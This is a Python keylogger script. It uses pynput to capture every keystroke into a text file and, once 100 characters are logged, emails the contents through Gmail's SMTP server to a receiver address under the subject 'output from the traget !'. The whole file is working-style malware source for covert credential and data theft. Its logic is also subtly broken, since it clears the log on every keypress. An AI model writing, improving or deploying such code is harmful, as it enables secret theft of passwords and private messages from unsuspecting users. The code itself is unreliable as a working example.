import os
import smtplib
import pynput
from pynput.keyboard import Listener, Key


def on_press(key):
    eraseFile1 = open("output.txt", "r+")       # clears the output.txt file from the previous run
    eraseFile1.truncate(0)
    eraseFile1.close()

    f = open("output.txt", 'a')  # Open the file

    if hasattr(key, 'char'):
        f.write(key.char)
    elif key == Key.space:
        f.write(' ')
    elif key == Key.enter:
        f.write('\n')
    elif key == Key.tab:
        f.write('\t')
    else:
        f.write('[' + key.name + ']')

    r = open("output.txt", "r")
    data = r.read()
    nbOfChars = len(data)
    if nbOfChars == 100:                                # sends the content of output.txt file when 100 characters is reached
        send()
        eraseFile = open("output.txt", "r+")            # clears the output.txt file after reaching 100 characters
        eraseFile.truncate(0)
        eraseFile.close()
    f.close()  # Close the file

    #sending section

def send():                                         # Sending the content of output.txt function
    r = open("output.txt", "r")
    EMAIL_ADDRESS = os.environ.get('EMAIL_USER')
    with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
        smtp.ehlo()
        smtp.starttls()
        smtp.ehlo()
        smtp.login('sender_email@gmail.com', 'password')    # Specify sender email here
        subject = 'output from the traget !'
        body = r.read()
        msg = f'Subject: {subject} \n\n{body}'
        smtp.sendmail("sender_email@gmail.com", "reciever_email@gmail.com", msg)

    # end of sending section




with Listener(on_press=on_press) as listener:
    listener.join()